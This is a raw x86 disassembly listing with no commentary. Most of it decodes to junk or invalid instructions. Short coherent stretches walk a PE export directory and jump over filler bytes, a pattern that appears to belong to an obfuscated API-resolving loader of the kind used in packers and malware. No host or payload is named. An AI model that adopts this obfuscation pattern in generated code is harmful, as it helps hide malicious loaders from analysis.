  403004:	aam    0xb1
  403006:	dec    eax
  403007:	dec    edi
  403008:	xor    ch,BYTE PTR [edi-0x60]
  40300b:	dec    ebp
  40300c:	in     eax,0xc9
  40300e:	iret   
  40300f:	lahf   
  403010:	lods   eax,DWORD PTR ds:[esi]
  403011:	push   edx
  403012:	jno    0x40308f
  403014:	jb     0x40305f
  403016:	fidiv  DWORD PTR [edi-0x67efb580]
  40301c:	scas   eax,DWORD PTR es:[edi]
  40301d:	mul    DWORD PTR [eax-0x392ed539]
  403023:	push   edi
  403024:	xchg   edi,eax
  403025:	push   ss
  403026:	sbb    ecx,DWORD PTR [ebx+0x8]
  403029:	sub    eax,0x9db99f5e
  40302e:	or     BYTE PTR [ebp-0x33],0xed
  403032:	sti    
  403033:	push   cs
  403034:	xchg   DWORD PTR [edi-0x10f27979],esi
  40303a:	in     eax,0x54
  40303c:	cmc    
  40303d:	inc    esi
  40303e:	test   al,0xc1
  403040:	cmp    dl,BYTE PTR [edx+0x665c904f]
  403046:	dec    ebp
  403047:	cvtps2pd xmm4,xmm5
  40304a:	scas   al,BYTE PTR es:[edi]
  40304b:	mov    eax,0x478d74ca
  403050:	mov    ebx,0xed5a8f06
  403055:	jno    0x403034
  403057:	cmp    ebp,DWORD PTR [edx+0x2a53eef4]
  40305d:	xor    al,0x59
  40305f:	mov    ebp,0x9c1f29c5
  403064:	fwait
  403065:	and    DWORD PTR [esi-0x69a27d51],esp
  40306b:	shl    edi,1
  40306d:	push   ebx
  40306e:	ds sti 
  403070:	adc    ch,0x78
  403073:	and    edi,esp
  403075:	mov    eax,ds:0x5b68e55f
  40307a:	cmp    DWORD PTR [esi],ebx
  40307c:	into   
  40307d:	sub    edi,DWORD PTR [eax-0x10]
  403080:	mov    eax,DWORD PTR [ebp+0x8]
  403083:	mov    ecx,DWORD PTR [ebp-0x8]
  403086:	jmp    0x403325
  40308b:	ror    esp,1
  40308d:	ror    edx,1
  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	add    al,0xd0
  403099:	out    0x67,eax
  40309b:	xchg   edx,eax
  40309c:	adc    eax,0x7efe7878
  4030a1:	js     0x40311b
  4030a3:	mov    esi,0x31ddddca
  4030a8:	imul   ecx,DWORD PTR [eax],0x29
  4030ab:	inc    ebx
  4030ac:	jns    0x4030c8
  4030ae:	nop
  4030af:	loop   0x40312c
  4030b1:	stc    
  4030b2:	scas   al,BYTE PTR es:[edi]
  4030b3:	gs jo  0x4030c3
  4030b6:	or     BYTE PTR [esi],bh
  4030b8:	mov    ah,0xea
  4030ba:	hlt    
  4030bb:	(bad)  
  4030bc:	pop    ebp
  4030bd:	jmp    0x403043
  4030bf:	xlat   BYTE PTR ds:[ebx]
  4030c0:	out    0x70,eax
  4030c2:	mov    WORD PTR [ecx],gs
  4030c4:	add    DWORD PTR [edi+0x21],0xffffffd4
  4030c8:	aad    0x8d
  4030ca:	cmp    DWORD PTR gs:[edi+0x76],ecx
  4030ce:	dec    ebp
  4030cf:	mov    BYTE PTR [eax+0x5e],ah
  4030d2:	jo     0x403125
  4030d4:	ja     0x4030b2
  4030d6:	mov    ah,BYTE PTR [edi+0x45a68e57]
  4030dc:	mov    eax,0x6386ede0
  4030e1:	or     eax,0xe6544620
  4030e6:	mov    dl,0x3f
  4030e8:	xor    dh,0xd9
  4030eb:	or     al,BYTE PTR [edi]
  4030ed:	adc    DWORD PTR [ebp+0x27],0x4ba46b94
  4030f4:	pop    esp
  4030f5:	mov    edi,DWORD PTR [edx+0x76717790]
  4030fb:	mov    dh,0x9d
  4030fd:	xor    DWORD PTR [edx+0x1c],eax
  403100:	clc    
  403101:	mov    dh,0xa
  403103:	push   es
  403104:	fwait
  403105:	shr    BYTE PTR [edx],1
  403107:	test   eax,0xd07ea5aa
  40310c:	bound  esi,QWORD PTR [ecx+0x7e]
  40310f:	cmp    al,0xa0
  403111:	add    eax,0x70e3d9c2
  403116:	or     dh,bl
  403118:	add    BYTE PTR [edi],bh
  40311a:	ret    0x8922
  40311d:	ins    BYTE PTR es:[edi],dx
  40311e:	aas    
  40311f:	jmp    0x403109
  403121:	repz sti 
  403123:	adc    al,0x8e
  403125:	push   esi
  403126:	test   BYTE PTR [eax],dh
  403128:	fadd   QWORD PTR [eax]
  40312a:	add    al,0x7a
  40312c:	jp     0x403164
  40312e:	js     0x4030dc
  403130:	inc    eax
  403131:	and    edi,DWORD PTR [edi]
  403133:	arpl   WORD PTR [eax+0x3db663e9],dx
  403139:	fimul  DWORD PTR [esp+edi*2-0x38]
  40313d:	sbb    al,0x54
  40313f:	and    DWORD PTR [eax+eiz*2+0x7b19edb0],ebx
  403146:	mov    ecx,0x21be58af
  40314b:	and    edi,eax
  40314d:	cmc    
  40314e:	xlat   BYTE PTR ds:[ebx]
  40314f:	xor    al,0xa4
  403151:	add    DWORD PTR [edi+0x15],esp
  403154:	xchg   DWORD PTR [esi-0x4ea182b7],edi
  40315a:	or     al,BYTE PTR [esi+0xb]
  40315d:	mov    edx,0xa6e3a861
  403162:	or     DWORD PTR [ebp-0x3c],0xcabde709
  403169:	cmp    al,ah
  40316b:	jle    0x40312b
  40316d:	jo     0x40319a
  40316f:	leave  
  403170:	xor    DWORD PTR [ecx],esi
  403172:	xchg   esp,eax
  403173:	ss jp  0x403108
  403176:	test   al,0xb6
  403178:	inc    esi
  403179:	and    cl,BYTE PTR [eax+0xa]
  40317c:	xchg   ebp,eax
  40317d:	shr    DWORD PTR [esi+0x29a8b863],cl
  403183:	aas    
  403184:	inc    ebx
  403185:	or     esi,DWORD PTR [ebp+0x74]
  403188:	inc    ecx
  403189:	inc    ebp
  40318a:	into   
  40318b:	pop    esp
  40318c:	adc    eax,0xa554f3c8
  403191:	fcomp  QWORD PTR [esi]
  403193:	pushf  
  403194:	adc    bl,ch
  403196:	mov    ch,0x3d
  403198:	mov    bl,0x73
  40319a:	push   ss
  40319b:	dec    edi
  40319c:	jmp    0x4031c2
  40319e:	fwait
  40319f:	(bad)  
  4031a0:	test   BYTE PTR [eax],ch
  4031a2:	sbb    ax,0x52f2
  4031a6:	test   al,0xeb
  4031a8:	sti    
  4031a9:	test   al,0x4c
  4031ab:	add    ecx,DWORD PTR [ebx+0x14]
  4031ae:	jmp    DWORD PTR [ecx+0x31]
  4031b1:	mov    ds:0xb6356c20,eax
  4031b6:	stos   BYTE PTR es:[edi],al
  4031b7:	pop    es
  4031b8:	pusha  
  4031b9:	std    
  4031ba:	dec    esp
  4031bb:	sbb    ah,BYTE PTR [edi+eax*1+0x184e52b4]
  4031c2:	dec    ebx
  4031c3:	sub    eax,edi
  4031c5:	mov    edx,cs
  4031c7:	xor    bl,BYTE PTR [esi+0x463db2ab]
  4031cd:	lods   eax,DWORD PTR ds:[esi]
  4031ce:	add    BYTE PTR [eax-0x4ebf30db],dl
  4031d4:	inc    DWORD PTR [esi+eax*2-0x5c]
  4031d8:	xchg   edi,eax
  4031d9:	inc    eax
  4031da:	ins    DWORD PTR es:[edi],dx
  4031db:	test   al,0xa0
  4031dd:	dec    ebp
  4031de:	cli    
  4031df:	pop    edi
  4031e0:	ret    
  4031e1:	jmp    0x40321b
  4031e3:	inc    edx
  4031e4:	ror    DWORD PTR [edi-0x7fe81810],1
  4031ea:	dec    ebx
  4031eb:	push   es
  4031ec:	push   esi
  4031ed:	fcomp  QWORD PTR [ebx+0x45385621]
  4031f3:	addr16 test eax,0x4352ad5b
  4031f9:	dec    ebp
  4031fa:	dec    esi
  4031fb:	mov    ds:0xa9ef37e0,al
  403200:	mov    ah,0xaf
  403202:	in     eax,dx
  403203:	int    0x4a
  403205:	call   0xae81:0x173ae60c
  40320c:	xor    al,0x97
  40320e:	repz loopne 0x40320a
  403211:	or     ch,cl
  403213:	jle    0x4031a3
  403215:	inc    edi
  403216:	jae    0x403217
  403218:	icebp  
  403219:	mov    al,al
  40321b:	mov    gs,WORD PTR [eax]
  40321d:	and    DWORD PTR [edx-0x13],0x5fc4b1d
  403224:	jns    0x4032a3
  403226:	or     dl,al
  403228:	xchg   ebp,eax
  403229:	or     al,0xf1
  40322b:	xchg   DWORD PTR [edi-0x77],eax
  40322e:	xchg   edx,eax
  40322f:	jl     0x403277
  403231:	jae    0x40329c
  403233:	cwde   
  403234:	inc    esi
  403235:	loope  0x4031d0
  403237:	ret    0x1773
  40323a:	sahf   
  40323b:	mov    bl,0x65
  40323d:	iret   
  40323e:	mov    esp,0xa8dc5785
  403243:	ja     0x403215
  403245:	aaa    
  403246:	jl     0x40329d
  403248:	jecxz  0x4031e7
  40324a:	hlt    
  40324b:	inc    eax
  40324c:	sbb    al,0xc3
  40324e:	jle    0x40327c
  403250:	and    esp,DWORD PTR [eax+0x8427d11]
  403256:	jmp    0xece90ab7
  40325b:	sub    ebp,DWORD PTR [edi]
  40325d:	ins    DWORD PTR es:[edi],dx
  40325e:	jbe    0x4032df
  403260:	pop    eax
  403261:	test   eax,0x914f12e2
  403266:	mov    esi,0x2c44a948
  40326b:	mov    cl,0x59
  40326d:	lock (bad) 
  40326f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403270:	jns    0x4031f8
  403272:	scas   al,BYTE PTR es:[edi]
  403273:	in     al,dx
  403274:	(bad)  
  403275:	cmp    cl,BYTE PTR [edi]
  403277:	jne    0x403223
  403279:	out    0xe0,al
  40327b:	loopne 0x40328a
  40327d:	jns    0x4032c1
  40327f:	ins    DWORD PTR es:[edi],dx
  403280:	test   DWORD PTR [esi+0x7d866b82],edi
  403286:	fisubr WORD PTR [ebx+0x3c833c1]
  40328c:	(bad)
  403290:	je     0x4032f1
  403292:	dec    ebx
  403293:	pop    edi
  403294:	lock mov ds:0xf9af96a8,al
  40329a:	xor    al,0x60
  40329c:	leave  
  40329d:	into   
  40329e:	leave  
  40329f:	adc    BYTE PTR [edi],bh
  4032a1:	sbb    dl,BYTE PTR [ecx+ebx*8+0x5f]
  4032a5:	pop    ebp
  4032a6:	data16 aam 0x26
  4032a9:	out    0xb7,al
  4032ab:	xchg   esp,eax
  4032ac:	sahf   
  4032ad:	mov    ebp,0x69e6823a
  4032b2:	and    ecx,DWORD PTR [eax-0x11]
  4032b5:	into   
  4032b6:	iret   
  4032b7:	pusha  
  4032b8:	bound  ecx,QWORD PTR ds:0x7d578844
  4032be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032bf:	push   ebx
  4032c0:	adc    BYTE PTR [edi-0x14fb5181],bl
  4032c6:	enter  0xc467,0xde
  4032ca:	rcl    dl,cl
  4032cc:	cmp    esp,DWORD PTR [esi]
  4032ce:	call   0x7b4:0x948176ad
  4032d5:	push   ds
  4032d6:	sub    DWORD PTR ds:0x319f4ba9,0x10
  4032dd:	xor    edx,DWORD PTR [ebx-0x5c]
  4032e0:	sahf   
  4032e1:	push   ebx
  4032e2:	inc    edi
  4032e3:	sbb    cl,BYTE PTR [esi+0x5c]
  4032e6:	in     al,dx
  4032e7:	bound  esi,QWORD PTR [ebx]
  4032e9:	scas   al,BYTE PTR es:[edi]
  4032ea:	repnz dec BYTE PTR [ebp-0x6]
  4032ee:	das    
  4032ef:	lds    ecx,FWORD PTR [edi+0x69]
  4032f2:	in     eax,dx
  4032f3:	xchg   ebx,eax
  4032f4:	jne    0x403292
  4032f6:	or     dl,BYTE PTR [ecx+0x5d]
  4032f9:	xor    ecx,DWORD PTR [ebx]
  4032fb:	lock jo 0x403294
  4032fe:	iret   
  4032ff:	mov    ds:0x355aaf77,eax
  403304:	mov    ah,0x90
  403306:	scas   eax,DWORD PTR es:[edi]
  403307:	jmp    0x403383
  403309:	out    0xe2,eax
  40330b:	js     0x40334b
  40330d:	dec    esp
  40330e:	mov    ah,BYTE PTR [edx+0x10]
  403311:	(bad)  
  403312:	leave  
  403313:	cmp    eax,0xbe2afc28
  403318:	aam    0x33
  40331a:	add    cl,ch
  40331c:	pop    edx
  40331d:	sub    al,0x5b
  40331f:	repz mov dh,0x80
  403322:	lds    ebx,FWORD PTR [ecx]
  403324:	or     eax,0xc703c633
  403329:	cmp    DWORD PTR [ecx],eax
  40332b:	je     0x4040c9
  403331:	mov    ecx,DWORD PTR [ebp-0x14]
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx+0x5c23cb6]
  403372:	in     al,0xc6
  403374:	add    al,0x10
  403376:	sbb    bh,BYTE PTR [eax+0x78]
  403379:	(bad)  
  40337a:	jle    0x4033f4
  40337c:	js     0x403378
  40337e:	inc    ecx
  40337f:	stos   DWORD PTR es:[edi],eax
  403380:	adc    eax,0xfc04007f
  403385:	add    BYTE PTR ds:0x25ce7a1a,ah
  40338b:	mov    edx,0x25cb14c7
  403390:	shl    DWORD PTR [ebx],0x9c
  403393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403394:	(bad)  
  403395:	jle    0x40336f
  403397:	cdq    
  403398:	or     DWORD PTR [ebp-0x8],0x62
  40339c:	cwde   
  40339d:	test   eax,0xd24f0607
  4033a2:	inc    ebp
  4033a3:	pop    edx
  4033a4:	jno    0x4033c1
  4033a6:	pop    ebp
  4033a7:	je     0x40336a
  4033a9:	nop
  4033aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033ab:	xor    eax,0x71763c49
  4033b0:	sub    eax,0x122c98d2
  4033b5:	jne    0x403432
  4033b7:	pusha  
  4033b8:	lahf   
  4033b9:	lds    ebp,FWORD PTR [edi-0x75]
  4033bc:	pop    ebx
  4033bd:	mov    eax,ds:0x2140828d
  4033c2:	jne    0x4033e8
  4033c4:	aas    
  4033c5:	mov    cl,0xa2
  4033c7:	or     eax,0x32b6a83a
  4033cc:	test   al,0x1f
  4033ce:	js     0x40337b
  4033d0:	fisttp WORD PTR cs:[ebx+0x74]
  4033d4:	pusha  
  4033d5:	(bad)  
  4033d6:	xchg   edx,eax
  4033d7:	pop    esi
  4033d8:	outs   dx,BYTE PTR ds:[esi]
  4033d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033da:	add    bh,bl
  4033dc:	lds    ebp,FWORD PTR [ebx+ecx*4]
  4033df:	mov    dl,0xb1
  4033e1:	sbb    bl,0x8
  4033e4:	frstor [esi+0xb]
  4033e7:	arpl   di,si
  4033e9:	mov    BYTE PTR [ecx+0x1a],dh
  4033ec:	push   ss
  4033ed:	int    0x45
  4033ef:	xchg   ebp,eax
  4033f0:	(bad)  
  4033f1:	in     eax,dx
  4033f2:	xor    BYTE PTR [esi],ah
  4033f4:	(bad)
  4033f8:	cmc    
  4033f9:	(bad)  
  4033fa:	stos   DWORD PTR es:[edi],eax
  4033fb:	outs   dx,BYTE PTR ds:[esi]
  4033fc:	lds    eax,FWORD PTR [ecx]
  4033fe:	fs push esp
  403400:	retf   0xcc60
  403403:	push   esp
  403404:	bound  edx,QWORD PTR [edi+0x17]
  403407:	enter  0xd2b1,0x7c
  40340b:	rcl    esi,1
  40340d:	adc    DWORD PTR [edx+ecx*4+0x41f6d927],ecx
  403414:	ja     0x4033c0
  403416:	cli    
  403417:	mov    ecx,0x71448ed4
  40341c:	enter  0x8b97,0xfa
  403420:	dec    esp
  403421:	mov    ebx,0xa6325f34
  403426:	add    esp,DWORD PTR [ebp-0x61]
  403429:	xor    DWORD PTR [esi-0x9147d7],ebp
  40342f:	xchg   ebx,eax
  403430:	enter  0x4c4c,0xaf
  403434:	cmp    DWORD PTR [eax-0x4],0x42
  403438:	in     al,0x21
  40343a:	out    0x33,al
  40343c:	xor    bh,BYTE PTR [edx-0x35eb44f9]
  403442:	ficom  DWORD PTR [eax-0x4f]
  403445:	call   0x8629:0x6dcb455d
  40344c:	mov    edi,0xa73f48db
  403451:	imul   di,WORD PTR [ebp+esi*1+0x4],0x9ddb
  403458:	stos   BYTE PTR es:[edi],al
  403459:	mov    dl,0xe
  40345b:	push   ebx
  40345c:	xor    ebp,DWORD PTR [ecx-0x9e0e2ca]
  403462:	(bad)  
  403464:	xor    esi,ecx
  403466:	sbb    DWORD PTR [bx-0x20],eax
  40346a:	mov    al,ds:0x623b4699
  40346f:	inc    edi
  403470:	xchg   ecx,eax
  403471:	xchg   DWORD PTR [edi],eax
  403473:	ror    DWORD PTR [edx+0x27c356b6],0x2e
  40347a:	(bad)  
  40347b:	jmp    0x403417
  40347d:	int3   
  40347e:	add    BYTE PTR [eax-0xc64f995],bl
  403484:	loopne 0x4034ad
  403486:	sub    ch,al
  403488:	mov    esi,0x4be26f1a
  40348d:	jnp    0x40341c
  40348f:	mov    esp,0x45dbc1d2
  403494:	sub    DWORD PTR [eax+0x736545ba],ebp
  40349a:	nop
  40349b:	das    
  40349c:	push   ebp
  40349d:	out    0x28,eax
  40349f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034a0:	lds    eax,FWORD PTR [esi-0x6]
  4034a3:	repnz mov DWORD PTR [esi+0x23],edi
  4034a7:	imul   esi,ecx,0xf41874cd
  4034ad:	lahf   
  4034ae:	adc    eax,0x8292ffd6
  4034b3:	adc    DWORD PTR [ebx],ebp
  4034b5:	jb     0x40351f
  4034b7:	mov    cl,dh
  4034b9:	lods   eax,DWORD PTR ds:[esi]
  4034ba:	mov    edx,0xababcd30
  4034bf:	jmp    0x403514
  4034c1:	inc    edx
  4034c2:	loopne 0x40351a
  4034c4:	adc    BYTE PTR [ebp-0x55],ch
  4034c7:	pop    ebx
  4034c8:	cli    
  4034c9:	jns    0x4034cf
  4034cb:	cmp    bl,BYTE PTR [edi-0x4f]
  4034ce:	pop    esp
  4034cf:	pop    ebp
  4034d0:	xor    bh,BYTE PTR [ebx-0x7d]
  4034d3:	das    
  4034d4:	hlt    
  4034d5:	out    dx,al
  4034d6:	jl     0x403519
  4034d8:	xchg   ebp,eax
  4034d9:	xchg   edi,eax
  4034da:	ffreep st(0)
  4034dc:	clc    
  4034dd:	lock stos BYTE PTR es:[edi],al
  4034df:	pusha  
  4034e0:	dec    esi
  4034e1:	adc    dh,ch
  4034e3:	les    edx,FWORD PTR [ecx]
  4034e5:	or     al,0xc2
  4034e7:	jb     0x403519
  4034e9:	dec    ebp
  4034ea:	dec    ecx
  4034eb:	pop    ecx
  4034ec:	pop    es
  4034ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034ee:	jg     0x40347d
  4034f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034f1:	stos   DWORD PTR es:[edi],eax
  4034f2:	out    dx,eax
  4034f3:	jmp    0x40351c
  4034f5:	pop    esp
  4034f6:	pop    ss
  4034f7:	cmc    
  4034f8:	mov    ch,0xc3
  4034fa:	cmp    dh,BYTE PTR [esi-0x3f798500]
  403500:	sub    BYTE PTR ds:[ecx+ebx*1+0x4658d1d5],cl
  403508:	js     0x4034ab
  40350a:	repz sbb al,0x52
  40350d:	outs   dx,DWORD PTR ds:[esi]
  40350e:	cdq    
  40350f:	es iret 
  403511:	jecxz  0x403533
  403513:	add    eax,0x77909196
  403518:	xchg   ecx,eax
  403519:	pushf  
  40351a:	sub    esp,DWORD PTR [edi]
  40351c:	outs   dx,BYTE PTR ds:[esi]
  40351d:	hlt    
  40351e:	or     cl,BYTE PTR [edx-0x1a]
  403521:	int3   
  403522:	dec    edx
  403523:	inc    eax
  403524:	les    edx,FWORD PTR [ebx-0x7c70134c]
  40352a:	cmc    
  40352b:	dec    edx
  40352c:	fdiv   QWORD PTR [eax+0x190e4d4c]
  403532:	sbb    dl,bl
  403534:	dec    esi
  403535:	inc    ebx
  403536:	xchg   ebp,eax
  403537:	lahf   
  403538:	leave  
  403539:	out    dx,al
  40353a:	lea    eax,[edi]
  40353c:	inc    edx
  40353d:	or     eax,DWORD PTR [eax]
  40353f:	ret    0xc6d0
  403542:	push   ecx
  403543:	lock push ds
  403545:	aas    
  403546:	imul   BYTE PTR [edi+0x76ab86f3]
  40354c:	and    BYTE PTR [edi-0x71626f0a],cl
  403552:	je     0x40355e
  403554:	out    dx,al
  403555:	aad    0x78
  403557:	sub    BYTE PTR [ecx+0xa8417c],dh
  40355d:	xchg   BYTE PTR [eax+eax*1+0x61],al
  403561:	mov    edi,0x873ddb0a
  403566:	aaa    
  403567:	(bad)  
  403568:	call   0x51816088
  40356d:	push   ds
  40356e:	fmul   QWORD PTR [ebx+0xb]
  403571:	dec    ebp
  403572:	push   0x1b
  403574:	pop    ecx
  403575:	inc    edi
  403576:	out    0xd2,eax
  403578:	call   0x2323:0x80b8124a
  40357f:	js     0x4035c5
  403581:	or     eax,0xa1c1a790
  403586:	shl    ebx,1
  403588:	pop    es
  403589:	es pop es
  40358b:	ins    DWORD PTR es:[edi],dx
  40358c:	sub    ch,bh
  40358e:	jo     0x4035ae
  403590:	pop    ebx
  403591:	mov    ecx,0xd0d05c4c
  403596:	jl     0x403609
  403598:	pop    edx
  403599:	mov    al,0xd3
  40359b:	test   DWORD PTR [ebx],0xd97ff293
  4035a1:	xchg   edx,eax
  4035a2:	pop    DWORD PTR [ebx+0x33]
  4035a5:	sub    al,0x7c
  4035a7:	lds    ecx,FWORD PTR [eax-0x36b0b325]
  4035ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035ae:	ins    BYTE PTR es:[edi],dx
  4035af:	pusha  
  4035b0:	cdq    
  4035b1:	js     0x403547
  4035b3:	es and cl,al
  4035b6:	xor    eax,0x93311b47
  4035bb:	out    0xa8,eax
  4035bd:	xor    ebp,DWORD PTR [esi]
  4035bf:	push   edi
  4035c0:	and    BYTE PTR [ebp+ebx*2+0x74],bl
  4035c4:	sbb    ebp,DWORD PTR [esp+edi*2-0x39]
  4035c8:	sub    ecx,esi
  4035ca:	sti    
  4035cb:	xor    DWORD PTR [edx+ecx*8+0xa],ebx
  4035cf:	pop    es
  4035d0:	fwait
  4035d1:	or     dl,al
  4035d3:	cli    
  4035d4:	sbb    eax,0x7823b2bc
  4035d9:	mov    bl,0x69
  4035db:	popf   
  4035dc:	shl    cl,0x34
  4035df:	lds    ecx,FWORD PTR [edi-0x7e869a78]
  4035e5:	jns    0x40365f
  4035e7:	mov    dh,0x8d
  4035e9:	push   ecx
  4035ea:	mov    al,0x9
  4035ec:	xchg   esi,eax
  4035ed:	xchg   ebx,eax
  4035ee:	jmp    0x80206df5
  4035f3:	adc    bh,ah
  4035f5:	fst    DWORD PTR [eax+eax*2-0x17]
  4035f9:	xchg   edx,eax
  4035fa:	and    al,0xc1
  4035fc:	test   DWORD PTR [ecx+edi*1+0x33],edi
  403600:	mov    BYTE PTR [ebx],0xc7
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0xcd626e44,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x403699
  40363f:	push   es
  403640:	cs cmp al,0x64
  403643:	or     BYTE PTR [ebp+eiz*1-0x624483ba],dl
  40364a:	add    DWORD PTR [ebp+ecx*2-0x79c85588],esp
  403651:	pop    esi
  403652:	xlat   BYTE PTR ds:[ebx]
  403653:	add    eax,0xc1500f09
  403658:	imul   ecx,DWORD PTR [ebp-0x2f],0x70b9092a
  40365f:	mov    ah,0xd0
  403661:	xor    bh,ah
  403663:	push   edx
  403664:	js     0x4036bc
  403666:	xchg   esi,eax
  403667:	frstor [esi+0x2bc68424]
  40366d:	stos   BYTE PTR es:[edi],al
  40366e:	sub    al,0x18
  403670:	inc    ebp
  403671:	fs cmp ebx,edx
  403674:	out    0x8a,eax
  403676:	sub    DWORD PTR [ebp-0x4c],ebx
  403679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40367a:	sbb    BYTE PTR [eax],cl
  40367c:	in     eax,0x34
  40367e:	faddp  st(6),st
  403680:	leave  
  403681:	cmp    BYTE PTR [edx-0x188ef8c3],ah
  403687:	pop    ds
  403688:	and    dh,cl
  40368a:	test   DWORD PTR [edx-0x3d],esi
  40368d:	add    BYTE PTR [ebx+edx*8-0x72],ah
  403691:	jg     0x4036cd
  403693:	outs   dx,BYTE PTR ds:[esi]
  403694:	aaa    
  403695:	test   BYTE PTR [edx+0x2209cc40],al
  40369b:	pushf  
  40369c:	fcmovu st,st(3)
  40369e:	mov    BYTE PTR [edi],ah
  4036a0:	mov    eax,ds:0x8a974fd6
  4036a5:	lds    ebx,FWORD PTR [ecx]
  4036a7:	pop    es
  4036a8:	jb     0x40371f
  4036aa:	arpl   WORD PTR [esi+0x38],cx
  4036ad:	fisttp WORD PTR [esi-0xb691582]
  4036b3:	ss shl dl,cl
  4036b6:	push   esp
  4036b7:	scas   eax,DWORD PTR es:[edi]
  4036b8:	pop    ebp
  4036b9:	xchg   ebp,eax
  4036ba:	add    DWORD PTR [edx-0x56],0xffffff94
  4036be:	pop    ss
  4036bf:	mov    eax,0x76b55e70
  4036c4:	pop    esi
  4036c5:	pop    esp
  4036c6:	push   esp
  4036c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036c8:	data16 add BYTE PTR [eax+0x13a6b710],al
  4036cf:	mov    WORD PTR [eax-0x3b5f691f],fs
  4036d5:	pop    ds
  4036d6:	cmp    DWORD PTR [eax-0x415b47b4],0xffffffe8
  4036dd:	shr    DWORD PTR [ebp-0x677d6c5b],1
  4036e3:	and    eax,DWORD PTR [eax]
  4036e5:	mov    dl,0x18
  4036e7:	into   
  4036e8:	fistp  WORD PTR [ebx-0x2dc67ec8]
  4036ee:	dec    ebx
  4036ef:	and    DWORD PTR [ebp+0x39],ebx
  4036f2:	pushf  
  4036f3:	out    0x4e,eax
  4036f5:	adc    ebx,DWORD PTR [esi]
  4036f7:	ins    DWORD PTR es:[edi],dx
  4036f8:	add    al,0x7d
  4036fa:	jmp    0x403692
  4036fc:	ss fs pop ds
  4036ff:	(bad)  
  403700:	mov    esi,0xa0967dc9
  403705:	fisttp WORD PTR [ebp+0x4d]
  403708:	adc    eax,0xe138893a
  40370d:	pop    edi
  40370e:	add    BYTE PTR [eax-0x6644720c],cl
  403714:	inc    ebx
  403715:	fdiv   DWORD PTR [ecx]
  403717:	ins    DWORD PTR es:[edi],dx
  403718:	or     DWORD PTR [esi],esp
  40371a:	pop    eax
  40371b:	rol    bh,cl
  40371d:	mov    WORD PTR [eax+edi*8-0x12983911],ds
  403724:	and    eax,0xac7bb650
  403729:	sbb    DWORD PTR [esi+0x34],edx
  40372c:	jmp    0xe046:0x345be6a6
  403733:	push   ebx
  403734:	fabs   
  403736:	div    BYTE PTR [esi+0x76]
  403739:	xchg   esp,eax
  40373a:	pusha  
  40373b:	repz dec ebp
  40373d:	sbb    edi,eax
  40373f:	lds    ebp,FWORD PTR [edx+ebp*4]
  403742:	call   DWORD PTR [ebp-0x7b2b6a98]
  403748:	mov    al,ds:0x9eda0ac9
  40374d:	push   esp
  40374e:	in     eax,0x18
  403750:	(bad)  
  403752:	add    ah,cl
  403754:	mov    bl,BYTE PTR [ecx-0xf]
  403757:	dec    eax
  403758:	xchg   edi,eax
  403759:	xchg   esp,eax
  40375a:	xor    BYTE PTR ds:0xacbae6cc,cl
  403760:	sbb    eax,0x944e0996
  403765:	or     al,0x2b
  403767:	ret    0xc0cd
  40376a:	push   edi
  40376b:	pop    ebp
  40376c:	xor    al,0x5b
  40376e:	test   BYTE PTR [edi],al
  403770:	inc    ebp
  403771:	lock lds esi,FWORD PTR ds:0xcdbd7677
  403778:	jne    0x4036fa
  40377a:	mov    dh,0x6c
  40377c:	(bad)  
  40377d:	adc    al,ah
  40377f:	mov    ds:0x925be76,eax
  403784:	fcom   QWORD PTR [ebx]
  403786:	jns    0x403738
  403788:	jbe    0x403799
  40378a:	jo     0x403738
  40378c:	(bad)  
  40378d:	fadd   QWORD PTR [edi+0x32f8f908]
  403793:	lods   eax,DWORD PTR ds:[esi]
  403794:	outs   dx,BYTE PTR ds:[esi]
  403795:	popa   
  403796:	add    ch,BYTE PTR [ebp-0x3d]
  403799:	mov    ecx,0x95c28f10
  40379e:	fldcw  WORD PTR [edx-0x2d2b4f47]
  4037a4:	aaa    
  4037a5:	mov    bh,0x45
  4037a7:	lods   eax,DWORD PTR ds:[esi]
  4037a8:	sbb    BYTE PTR [ebp-0x6c],ch
